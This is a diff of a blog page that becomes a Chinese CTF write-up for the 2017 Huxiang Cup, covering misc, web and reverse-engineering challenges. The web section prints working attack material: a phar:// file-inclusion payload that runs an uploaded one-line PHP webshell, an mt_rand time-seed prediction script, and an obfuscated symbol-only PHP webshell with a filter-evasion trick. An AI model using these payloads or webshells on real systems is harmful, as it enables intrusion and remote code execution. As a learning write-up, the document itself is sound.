@@ -12,7 +12,7 @@
     
     <title>
         
-            标签: 密码攻击 | 
+            2017年湖湘杯网络安全技能大赛Writeup | 
         
         AresX&#39;s Blog
     </title>
@@ -69,15 +69,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="https://ares-x.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="标签: 密码攻击 | AresX&#39;s Blog">
+    <meta property="og:title" content="2017年湖湘杯网络安全技能大赛Writeup | AresX&#39;s Blog">
     <meta property="og:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png" />
     <meta property="og:description" content="There is no description">
     
 
     
+        <meta property="article:published_time" content="11月 26, 2017" />
+        <meta property="article:modified_time" content="11月 26, 2017" />
+    
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="标签: 密码攻击 | AresX&#39;s Blog">
+    <meta name="twitter:title" content="2017年湖湘杯网络安全技能大赛Writeup | AresX&#39;s Blog">
     <meta name="twitter:description" content="There is no description">
     <meta name="twitter:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -85,13 +88,43 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://ares-x.com/tags/密码攻击/index.html" />
+        <link rel="canonical" href="https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html" />
     
 
     <!-- Structured-data for SEO -->
     
         
 
+
+<script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "AresX&#39;s Blog",
+        "logo": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
+    },
+    "author": {
+        "@type": "Person",
+        "name": "AresX",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://cache-1253916356.file.myqcloud.com/img/favicon.png"
+        },
+        "description": "Anarchy is the key"
+    },
+    "headline": "2017年湖湘杯网络安全技能大赛Writeup",
+    "url": "https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html",
+    "datePublished": "11月 26, 2017",
+    "dateModified": "11月 26, 2017",
+    "description": "There is no description",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://ares-x.com"
+    }
+}
+</script>
 
 
     
@@ -287,97 +320,504 @@ document.getElementsByTagName('head')[0].appendChild(script);
                         </button>
                     
 
-                    <!-- Index Module -->
-<div class="material-index mdl-grid">
-    
-    <div class="locate-thumbnail-symbol"></div>
+                    <!-- Post TOC -->
 
-    <!-- Pin on top -->
+    
+    <!-- Back Button -->
+    <!--
+    <div class="material-back" id="backhome-div" tabindex="0">
+        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
+           href="#" onclick="window.history.back();return false;"
+           target="_self"
+           role="button"
+           data-upgraded=",MaterialButton,MaterialRipple">
+            <i class="material-icons" role="presentation">arrow_back</i>
+            <span class="mdl-button__ripple-container">
+                <span class="mdl-ripple"></span>
+            </span>
+        </a>
+    </div>
+    -->
+
+    <!-- Left aligned menu below button -->
+    <button id="post-toc-trigger-btn"
+        class="mdl-button mdl-js-button mdl-button--icon">
+        <i class="material-icons">format_list_numbered</i>
+    </button>
+
+    
+    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#2017年-“湖湘杯”网络安全技能大赛Writeup"><span class="post-toc-number">1.</span> <span class="post-toc-text">2017年 “湖湘杯”网络安全技能大赛Writeup</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#MISC"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">MISC</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#流量分析"><span class="post-toc-number">1.1.1.</span> <span class="post-toc-text">流量分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#热身运动"><span class="post-toc-number">1.1.2.</span> <span class="post-toc-text">热身运动</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#题目Encryptor-apk"><span class="post-toc-number">1.1.3.</span> <span class="post-toc-text">题目Encryptor.apk</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc300"><span class="post-toc-number">1.1.4.</span> <span class="post-toc-text">misc300</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#WEB"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">WEB</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web200"><span class="post-toc-number">1.2.1.</span> <span class="post-toc-text">web200:</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web150-random"><span class="post-toc-number">1.2.2.</span> <span class="post-toc-text">web150 random</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#web300"><span class="post-toc-number">1.2.3.</span> <span class="post-toc-text">web300</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#RE"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">RE</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#简单的Android"><span class="post-toc-number">1.3.1.</span> <span class="post-toc-text">简单的Android</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#RE100"><span class="post-toc-number">1.3.2.</span> <span class="post-toc-text">RE100</span></a></li></ol></li></ol></li></ol>
+        <!--
+        <li class="mdl-menu__item">
+            Some Action
+        </li>
+        -->
+    </ul>
     
 
-    <!-- Normal Post -->
-    
-        
-            
-                <!-- Paradox Thumbnail -->
-                <div class="post_entry-module mdl-card mdl-shadow--2dp mdl-cell mdl-cell--12-col fade out">
-    <!-- Post Thumbnail -->
+
+
+
+
+<!-- Layouts -->
+
+    <!-- Post Module -->
+    <div class="material-post_container">
+
+        <div class="material-post mdl-grid">
+            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">
+
+                <!-- Post Header(Thumbnail & Title) -->
+                
+    <!-- Paradox Post Header -->
     
         
             <!-- Random Thumbnail -->
             <div class="post_thumbnail-random mdl-card__media mdl-color-text--grey-50">
-        
-    
+            <script type="text/ls-javascript" id="post-thumbnail-script">
+    var randomNum = Math.floor(Math.random() * 19 + 1);
 
-        <!-- Post Title -->
-        <p class="article-headline-p"><a href="/2017/07/30/一句话Powershell调用mimikatz抓取密码/">一句话Powershell调用mimikatz抓取Windows密码</a></p>
-    </div>
-
-    <!-- Post Excerpt -->
-    <div class="mdl-color-text--grey-600 mdl-card__supporting-text post_entry-content">
-        
-            mimikatz简要介绍
-这篇文章
-        
-        &nbsp;&nbsp;&nbsp;
-        <span>
-            <a href="/2017/07/30/一句话Powershell调用mimikatz抓取密码/" target="_self">阅读全文</a>
-        </span>
-    </div>
-    <!-- Post_entry Info-->
-    <div id="post_entry-info">
-        <div id="post_entry-left-info" class="mdl-card__supporting-text meta mdl-color-text--grey-600 ">
-            <!-- Author Avatar -->
-            <div id="author-avatar">
-                <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="AresX's avatar">
-            </div>
-            <div>
-                <strong>AresX</strong>
-                <span>7月 30, 2017</span>
-            </div>
-        </div>
-        <div id="post_entry-right-info">
-            <!-- Category -->
-            <span class="post_entry-category">
-                <a class="post_category-link" href="/categories/渗透不测试/">渗透不测试</a>
-            </span>
-
-            
-
-            
-
-            <!-- Post Views -->
-            <span class="post_entry-views">
-            </span>
-        </div>
-    </div>
-</div>
-
-            
-            
-        
-    
-
-    
-
-    
-        <script type="text/ls-javascript" id="thumbnail-script">
-    var randomNum;
-
-    var locatePost = $('.locate-thumbnail-symbol').next();
-    for(var i = 0; i < 10; i++) {
-        randomNum = Math.floor(Math.random() * 19 + 1);
-
-        locatePost.children('.post_thumbnail-random').attr('id', 'random_thumbnail-'+randomNum);
-        locatePost.children('.post_thumbnail-random').attr('data-original', 'https://cache-1253916356.file.myqcloud.com/img/random/material-' + randomNum + '.png');
+    $('.post_thumbnail-random').attr('data-original', 'https://cache-1253916356.file.myqcloud.com/img/random/material-' + randomNum + '.png');
     $('.post_thumbnail-random').addClass('lazy');
-
-        locatePost = locatePost.next();
-    }
 </script>
 
+        
+    
+            <p class="article-headline-p">
+                2017年湖湘杯网络安全技能大赛Writeup
+            </p>
+        </div>
+
+
+
+
+
+                
+                    <!-- Paradox Post Info -->
+                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">
+
+    <!-- Author Avatar -->
+    <div id="author-avatar">
+        <img src="https://cache-1253916356.file.myqcloud.com/img/aresx.png" width="44px" height="44px" alt="Author Avatar"/>
+    </div>
+    <!-- Author Name & Date -->
+    <div>
+        <strong>AresX</strong>
+        <span>11月 26, 2017</span>
+    </div>
+
+    <div class="section-spacer"></div>
+
+    <!-- Favorite -->
+    <!--
+        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
+            <i class="material-icons" role="presentation">favorite</i>
+            <span class="visuallyhidden">favorites</span>
+        </button>
+    -->
+
+    <!-- Qrcode -->
+    
+        <button id="article-functions-qrcode-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">devices other</i>
+    <span class="visuallyhidden">devices other</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
+    <li class="mdl-menu__item">在其它设备中阅读本文章</li>
+    
+        <img src="https://pan.baidu.com/share/qrcode?w=246&h=246&url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/">
+    
+</ul>
+    
+
+    <!-- Tags (bookmark) -->
+    
+    <button id="article-functions-viewtags-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+        <i class="material-icons" role="presentation">bookmark</i>
+        <span class="visuallyhidden">bookmark</span>
+    </button>
+    <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
+        <li class="mdl-menu__item">
+        
+    </ul>
+    
+
+    <!-- Share -->
+    <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
+    <i class="material-icons" role="presentation">share</i>
+    <span class="visuallyhidden">share</span>
+</button>
+<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
+    
+
+    
+        
+            <!-- Busuanzi Views -->
+            <a class="post_share-link" href="#">
+                <li class="mdl-menu__item">
+                    <span id="busuanzi_container_page_pv">
+                        <span id="busuanzi_value_page_pv"></span>&nbsp;浏览量
+                    </span>
+                </li>
+            </a>
+        
+    
+
+    <!-- Share Weibo -->
+    
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=2017年湖湘杯网络安全技能大赛Writeup&url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html&pic=&searchPic=false&style=simple" target="_blank">
+            <li class="mdl-menu__item">
+                分享到微博
+            </li>
+        </a>
+    
+
+    <!-- Share Twitter -->
+    
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=2017年湖湘杯网络安全技能大赛Writeup&url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html&via=AresX" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Twitter
+            </li>
+        </a>
+    
+
+    <!-- Share Facebook -->
+    
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Facebook
+            </li>
+        </a>
+    
+
+    <!-- Share Google+ -->
+    
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Google+
+            </li>
+        </a>
+    
+
+    <!-- Share LinkedIn -->
+    
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html&title=2017年湖湘杯网络安全技能大赛Writeup" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 LinkedIn
+            </li>
+        </a>
+    
+
+    <!-- Share QQ -->
+    
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=2017年湖湘杯网络安全技能大赛Writeup&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 QQ
+            </li>
+        </a>
+    
+
+    <!-- Share Telegram -->
+    
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2017/11/26/2017年湖湘杯网络安全技能大赛Writeup/index.html&text=2017年湖湘杯网络安全技能大赛Writeup" target="_blank">
+            <li class="mdl-menu__item">
+                分享到 Telegram
+            </li>
+        </a>
+    
+</ul>
+
+</div>
+
+                
+
+                <!-- Post Content -->
+                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
+    
+        <h1 id="2017年-“湖湘杯”网络安全技能大赛Writeup"><a href="#2017年-“湖湘杯”网络安全技能大赛Writeup" class="headerlink" title="2017年 “湖湘杯”网络安全技能大赛Writeup"></a>2017年 “湖湘杯”网络安全技能大赛Writeup</h1><p><em>Misc ak,web差web400,pwn一分没有,re 两道，反正尽力了</em></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p>wireshar导出http文件发现flag.zip</p>
+<p><a href="https://i.loli.net/2017/11/25/5a198cec5cbdd.png" target="_blank" rel="external"><img src="https://i.loli.net/2017/11/25/5a198cec5cbdd.png" alt="P_$S5QAY5MQ397_CU7J_ICX.png"></a></p>
+<p>打开为rgb</p>
+<p><a href="https://i.loli.net/2017/11/25/5a198d6aa102f.png" target="_blank" rel="external"><img src="https://i.loli.net/2017/11/25/5a198d6aa102f.png" alt="KA$7~%GEBVA{$WA%]%CJLF9.png"></a></p>
+<p>使用脚本把rgb转换成图片</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<span class="token keyword">import</span> re
+x <span class="token operator">=</span> <span class="token number">887</span> 
+y <span class="token operator">=</span> <span class="token number">150</span> 
+image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGB"</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'ce.txt'</span><span class="token punctuation">)</span> 
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        l <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        r <span class="token operator">=</span> l<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">", "</span><span class="token punctuation">)</span>
+        image<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>int<span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>int<span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'image1.jpg'</span><span class="token punctuation">)</span>
+</code></pre>
+<p>打开图片得到flag</p>
+<p><img src="https://i.loli.net/2017/11/25/5a198dcb32f22.png" alt="XS[V4[KG8F9U)LY_AJ7I]0O.png"></p>
+<h3 id="热身运动"><a href="#热身运动" class="headerlink" title="热身运动"></a>热身运动</h3><p>一张gif，一个粉红色的老虎在一个国际象棋的棋盘上瞎j8动</p>
+<p>使用Stegoslove查看每一帧记录下老虎移动的坐标</p>
+<p><img src="https://i.loli.net/2017/11/25/5a198ea302b79.png" alt="LWRRM38HM6AB9"></p>
+<pre><code>5b 4g 2b 4b 5b 2h 3e 2b 5f 8f 1e 2b 7f 6f 1f 4g 5f 6g 1b 3g 5g 6h 2e
+</code></pre><p>百度64进制编码得到一张表，对应坐标记录数字</p>
+<p><img src="https://i.loli.net/2017/11/25/5a198f3996333.png" alt="YCTGBg"></p>
+<pre><code>5b 4g 2b 4b 5b 2h 3e 2b 5f 8f 1e 2b 7f 6f 1f 4g 5f 6g 1b 3g 5g 6h 2e 
+
+25 38 49 33 25 55 44 49 29 5  60 49 13 21 61 38 29 22 57 46 30 23 52
+</code></pre><p>再用数字对应base64码表</p>
+<p><img src="https://i.loli.net/2017/11/25/5a198f97b3de0.png" alt="72"></p>
+<pre><code>25 38 49 33 25 55 44 49 29 5  60 49 13 21 61 38 29 22 57 46 30 23 52
+Z  m  x  h  Z  3  s  x  d  F  8  x  N  V  9  m  d  W  5  u  e  X  0
+ZmxhZ3sxdF8xNV9mdW5ueX0
+</code></pre><p>解最后的base64得到flag<br><code>flag{1t_15_funny}</code></p>
+<h3 id="题目Encryptor-apk"><a href="#题目Encryptor-apk" class="headerlink" title="题目Encryptor.apk"></a>题目Encryptor.apk</h3><p>逆向apk</p>
+<p><img src="https://i.loli.net/2017/11/25/5a199037e973a.png" alt="0Sng"></p>
+<p>得到关键代码</p>
+<p><img src="https://i.loli.net/2017/11/25/5a19919951012.png" alt="4Z}H"></p>
+<p>加密过程为：<br>j是md5以后的字符串换成字节了以后的长度<br>paramArrayOfByte1[i]是图片的每一个字节<br>用图片的每一个字节和md5字符串的第[i%j]号字节异或</p>
+<p>因为是异或加密，解密只需要再加密一次即可得到flag</p>
+<p>限制了加密文件必须为图片，把加密后的文件重命名为jpg放进加密机加密，得到flag图片</p>
+<p>这是题目修改前的flag图片<br><img src="https://i.loli.net/2017/11/25/5a1992381bfa2.jpg" alt="18F1AD86BA11B5C9653D73180E1DC65E.jpg"></p>
+<p>这他妈的字写的什么j8玩意？</p>
+<p>题目修改后的图片</p>
+<p><img src="https://i.loli.net/2017/11/25/5a19927fc7b68.png" alt=")CAWWIBDU$2`)(T$WE0K4JM.png"></p>
+<h3 id="misc300"><a href="#misc300" class="headerlink" title="misc300"></a>misc300</h3><p>题目为pkl后缀名</p>
+<p>pkl是python的序列化文件</p>
+<p>使用脚本读取之后是一行英文</p>
+<p><code>S&#39;The black pixels of a b/w image are at</code></p>
+<p>剩下的是很多坐标，使用画图模块绘制散点图</p>
+<pre><code>import pickle
+from PIL import Image
+import matplotlib.pyplot as plt
+
+f = open(&#39;pixels.jpg.pkl&#39;)
+inf = pickle.load(f)
+f.close()
+print inf
+print inf[0]
+pic=inf[1:]
+a=[]
+b=[]
+for i in pic:
+    x=i[0]
+    y=i[1]
+    print x,y
+    a.append(x)
+    b.append(y)
+
+
+plt.scatter(a,b,c = &#39;black&#39;,s = 1)
+# plt.plot(a,b,&#39;ko&#39;)
+plt.show()
+</code></pre><p><img src="https://i.loli.net/2017/11/25/5a199318f2701.png" alt="~png"></p>
+<p>把脑袋倒过来看，对</p>
+<p>是个漫画人物</p>
+<p>漫画名为凯文的幻虎世界，作者Bill Watterson</p>
+<p>flag 就是作者的名字<code>billwatterson</code></p>
+<p>嗯，cnm啊这尼玛谁想得到？出题人脑子可能有坑</p>
+<p><a href="https://github.com/ctfs/write-ups-2016/blob/master/pragyan-ctf-2016/steganography/who-made-me-100/README.md#other-write-ups-and-resources" target="_blank" rel="external">github原题</a></p>
+<p>人家原题叫who made me ,这tm 叫misc300。。醉了</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web200"><a href="#web200" class="headerlink" title="web200:"></a>web200:</h3><p>题目提示：只是一个普通的上传。<br>打开页面以后得到亮点提示：<br>a.只能上传png  b.htmlentities(ucfirst($op)); op变量做过简单的处理。</p>
+<p>打开upload页面发现<a href="http://118.190.87.135:10080/?op=upload" target="_blank" rel="external">http://118.190.87.135:10080/?op=upload</a>  ==&gt;  op=upload应该是文件包含。<br>扫描一下目录：<code>upload.php</code>、<code>home.php</code>、<code>flag.php</code>、<code>show.php</code>加上两个目录<code>image</code>和<code>uploads</code></p>
+<p>上传一个png</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199477a7d46.png" alt="{0Z)8U}WOM{[T(ORU6K])9G.png"></p>
+<p>页面返回URL:  <code>op=show&amp;imagekey=cf32f1071d5f2a4b89c72df04a1b5de02dce2bf1</code></p>
+<p>到这里就更加印证了是一个文件包含漏洞了<br>这个<code>imagekey</code>应该就是上传后的文件名，上传的文件应该是在<code>uploads</code>文件下：</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1994d41f613.png" alt="SQ_E"></p>
+<p>果然,然后包含它</p>
+<p><img src="https://i.loli.net/2017/11/26/5a19950718d99.png" alt="S5g"></p>
+<p>重新思考了一下，包含<code>upload.php</code>的时候，是<code>op=upload</code> 那么其代码应该是<code>op=$_GET[op].’.php’</code>;在文件中加上php的，这时候我想到<code>phar://</code>协议。<br>将<code>x.php</code>(一句话shell)压缩成zip格式，然后再改成png格式上传到服务器，用包含结合phar协议来执行php文件：<br>Payload：<br><code>op=phar://./uploads/e3b413b087bd7f56d3a67d3f970a88c489b60e66.png/x</code></p>
+<p>可以执行，然后读取flag.php中的内容</p>
+<p><code>Payload</code>:<code>x=highlight_file(&#39;././flag.php&#39;);</code></p>
+<p><img src="https://i.loli.net/2017/11/26/5a1995e9ef24f.png" alt="MURTSng"></p>
+<h3 id="web150-random"><a href="#web150-random" class="headerlink" title="web150 random"></a>web150 random</h3><p>这道题是相当的坑，11点出了以后到4点左右才正常。</p>
+<p>像这样的题，进去没什么提示，首先想到的源代码泄露，然后审计代码绕过一些的。访问.index.php.swp存在，这个是vi编辑器留下的，但是在11点-4点之间这段时间，这个里面根本没有源码，和index一样是乱码。</p>
+<p><img src="https://i.loli.net/2017/11/26/5a19963542d8d.png" alt="O.png"></p>
+<p>源码看到以后，就发现是<code>mt_rand()</code>伪加密，<code>mt_srand()</code>以<code>time()</code>为种子进行播种，<code>mt_rand()</code>生成的内容是依赖于<code>time()</code>的。<br>思路：用python直接访问页面拿到pwd的值，在<code>time()</code>生成的时间戳变化之前提交上去，就可以绕过第一层<code>if($pwd == $_GET[pwd])</code>，但是这乱码是什么东东？<br>把源码放在本地，然后去生成、输出pwd 和 session。</p>
+<p><img src="https://i.loli.net/2017/11/26/5a19968372d1f.png" alt="ng"></p>
+<p>发现还是乱码，那可能pwd就是乱码，ok。写个脚本，让脚本先访问题目地址，处理题目地址返回页面，取出pwd的值，再访问本地页面对比pwd的值，如果相同，则把本地页面生成的pwd、session的值分别作为pwd参数和action参数的值提交上去。</p>
+<p>Flag为：<code>you get the flag it is hxb2017{6583be26c1403c25677c03ac7b3d1f22}</code></p>
+<p><img src="https://i.loli.net/2017/11/26/5a19980a0eeef.png" alt="QG7SHg"></p>
+<p>脚本：</p>
+<pre><code>import requests,re
+
+#re_pass = re.compile(r&#39;&lt;br&gt;.+||&#39;)
+url = &quot;http://114.215.138.89:10080/&quot;
+while True:
+    res = requests.get(url)
+    s = res.content[29:-8]
+    print s
+    resloaction=requests.get(&quot;http://127.0.0.1/test.php&quot;)
+    list = resloaction.content.split(&#39; &#39;)
+    params={}
+    if list[0]==s :
+        params[&#39;login&#39;]=list[1]
+        params[&#39;pwd&#39;]=s
+        #params[&#39;login&#39;]=s
+    resp = requests.get(url,params=params)
+    if &#39;flag&#39; in resp.content :
+        print resp.content
+        break;
+    elif &#39;Wrong&#39; in resp.content :
+        print &#39;Wrong&#39;
+    elif &#39;first&#39; in resp.content :
+        print &#39;first&#39;
+    else :
+        pass
+</code></pre><p>本地页面源码</p>
+<pre><code>&lt;?php
+function create_password($pw_length =  10){
+$randpwd = &quot;&quot;;
+for ($i = 0; $i &lt; $pw_length; $i++){
+$randpwd .= chr(mt_rand(100, 200));
+}
+return $randpwd;
+}
+mt_srand(time());
+$pwd=create_password();
+echo $pwd.&#39; &#39;;
+//echo &quot;&lt;br&gt;&quot;;
+echo create_password(32).rand();
+</code></pre><h3 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h3><p>访问看到源码，过滤了很多字符，但是<code>()[]=’+.;</code>这些字符没过滤，题目又提示能getshell。这让我想起了以前在网上看到过的一个符号一句话木马。</p>
+<pre><code>&lt;?php
+$_=[].[];$__=&#39;&#39;;$_=$_[&#39;&#39;];$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;$_=++$_;$_=++$_;$__=$_.$__;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$__.=$_;${&#39;_&#39;.$__}[_](${&#39;_&#39;.$__}[__]);
+?&gt;
+</code></pre><p>但是提交被拦截</p>
+<p>因为<code>+</code>在url中表示空格，而题目拦截空格。所以要把<code>+</code> 进行一次URL编码，传入后会自动进行解码：<br>将符号一句话中的+全部用<code>%2b</code>替换</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1998ed4277c.png" alt="ng"></p>
+<p>getflag</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1998ee01dd7.png" alt="ng"></p>
+<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="简单的Android"><a href="#简单的Android" class="headerlink" title="简单的Android"></a>简单的Android</h3><p>apk文件</p>
+<p>解压后用dex2jar把classes.dex转换成jar包</p>
+<p>用jd-gui打开，发现代码中直接就包含了flag明文。没安装测试，直接交就过了</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199972c4db7.png" alt="Y_g"></p>
+<h3 id="RE100"><a href="#RE100" class="headerlink" title="RE100"></a>RE100</h3><p>发现是win，还有upx壳，用3.91版的upx -d解压成功</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1999a039448.png" alt="DPng"></p>
+<p>解压后直接运行会挂掉，ida打开，main函数就在启动函数上面几个（通过字符串提示发现main函数）</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1999cbceb97.png" alt="Q.png"></p>
+<p>按f5可以得到如下c代码</p>
+<p><img src="https://i.loli.net/2017/11/26/5a1999f1b2737.png" alt="ng"></p>
+<p>虽然很多函数没有识别，但是不影响这些分析<br>发现一堆没用的代码，其实关键的就是圈中的代码而已。这里的输入才会影响后面的结果。至于判断条件，if嵌套if，似乎不可能达成这些条件，应该是程序挂掉的原因。所以，直接进入关键函数<code>sub_401080</code></p>
+<p><img src="https://i.loli.net/2017/11/26/5a199a264c0dc.png" alt="Xg"></p>
+<p>明显是按位异或，供44个字符，每个和<code>x22</code>或后等于相应的值就可以，反向计算拿到flag。但是要注意顺序，读取的行数是换了的，而且注意低存低高存高</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199a588781f.png" alt="400SKg"></p>
+<p>本来想用idc脚本把数据抠出来，然后异或就好了。但是出了点问题，会读取出特别大的数字，只能一个一个手动弄出来。按照行的顺序，每一行从右边到左边。然后写python脚本如下：</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199a7e1364d.png" alt="9ng"></p>
+<p>执行得到结果</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199a9e73237.png" alt="1JAHng"></p>
+<hr>
+<p>ps:</p>
+<p>web400差点做出来，比赛结束前7分钟改题也是牛逼，misc100直接换题，misc300偷来原题还不给题目名，misc200用一堆写的屎一样的英文来强行加难度，这出题人真的是服气</p>
+<p>送出题人串字母啊 mmmmmmmmp!</p>
+<p><img src="https://i.loli.net/2017/11/26/5a199b981b208.png" alt="6B0A20D7E3459F95CF6A342445184C88.png"></p>
+<hr>
+<p><em>*转载请注明来自<a href="https://ares-x.com">AresX’s Blog</a></em></p>
+
+    
+
     
 </div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+    <!-- 使用 DISQUS_CLICK -->
+<div id="disqus-comment">
+    <div id="disqus_thread"></div>
+
+<!-- add animation -->
+<style>
+	.disqus_click_btn {
+            line-height: 30px;
+            margin: 0;
+            min-width: 50px;
+            padding: 0 14px;
+            display: inline-block;
+            font-family: "Roboto", "Helvetica", "Arial", sans-serif;
+            font-size: 14px;
+            font-weight: 400;
+            text-transform: uppercase;
+            letter-spacing: 0;
+            overflow: hidden;
+            will-change: box-shadow;
+            transition: box-shadow .2s cubic-bezier(.4, 0, 1, 1), background-color .2s cubic-bezier(.4, 0, .2, 1), color .2s cubic-bezier(.4, 0, .2, 1);
+            outline: 0;
+            cursor: pointer;
+            text-decoration: none;
